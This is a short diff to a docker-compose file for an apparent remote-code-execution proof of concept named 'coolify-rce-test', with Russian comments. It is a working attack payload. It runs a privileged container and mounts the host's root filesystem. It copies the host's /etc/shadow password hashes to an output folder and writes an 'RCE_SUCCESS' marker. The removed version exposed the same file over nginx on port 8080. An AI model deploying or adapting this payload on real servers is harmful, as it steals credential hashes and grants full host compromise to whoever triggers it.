@@ -2,16 +2,18 @@ version: '3.8'
 
 services:
   rce-test:
-    image: nginx:alpine
+    image: alpine:3.19
     container_name: coolify-rce-test
-    ports:
-      - "8080:80"
     volumes:
+      # Монтируем корень сервера в /host-root
       - /:/host-root
-      - ./public:/usr/share/nginx/html/public
+      # Монтируем папку для вывода (чтобы потом прочитать файл)
+      - ./output:/output
     privileged: true
+    # Команда: читаем shadow с хоста и пишем в папку output внутри контейнера
     command: >
       sh -c "
-        cat /host-root/etc/shadow > /usr/share/nginx/html/public/shadow.txt &&
-        nginx -g 'daemon off;'
+        cat /host-root/etc/shadow > /output/shadow.txt &&
+        echo 'RCE_SUCCESS' > /output/status.txt &&
+        sleep 3600
       "
